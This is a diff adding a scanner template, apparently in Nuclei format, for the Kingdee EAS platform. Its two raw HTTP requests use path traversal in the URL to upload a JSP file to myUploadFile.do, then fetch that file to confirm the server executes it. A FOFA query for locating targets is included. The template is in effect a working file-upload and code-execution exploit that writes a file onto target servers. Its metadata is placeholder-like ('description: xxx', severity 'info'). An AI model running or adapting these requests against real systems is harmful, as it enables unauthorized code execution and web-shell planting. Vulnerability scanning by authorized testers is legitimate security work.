@@ -1,0 +1,42 @@
+id: one
+info:
+  name: 金蝶EAS平台
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="Kingdee-EAS"
+http:
+  - raw:
+      - |
+        POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Content-Length: 210
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK
+
+        ------WebKitFormBoundarymVk33liI64J7GQaK
+        Content-Disposition: form-data; name="myFile";filename=".eofewfn2342weofnewfoe.jsp"
+        Content-Type: text/html
+
+        <% out.println("20231101");%>
+        ------WebKitFormBoundarymVk33liI64J7GQaK--
+
+      - |
+        GET /easportal/buffalo/%2e%2e/.eofewfn2342weofnewfoe.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate 
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "20231101"
